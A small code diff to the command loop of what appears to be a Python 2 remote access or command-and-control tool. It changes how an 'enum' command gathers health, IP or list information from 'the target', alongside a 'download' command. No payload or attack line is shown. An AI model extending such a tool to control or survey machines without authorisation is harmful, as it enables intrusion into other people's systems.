@@ -73,10 +73,15 @@ class Commander(object):
 
                     # displays the target's 'health' (CPU, Memory usage etc)
                     elif command.startswith('enum'):
-                        if len(command.split()) != 2:
-                            print '\n[!] Usage: enum --health   \t To get general info about the system'
+                        if len(command.split()) == 2:
+							if command.split()[1] == "health":
+								enumerate.health()
+							elif command.split()[1] == "ip":
+								enumerate.ip()
+							else:
+								enumerate.list()
                         else:
-                            enumerate.health()
+							enumerate.list()
 
                     elif command.startswith('download'):
                         if len(command.split()) < 2:
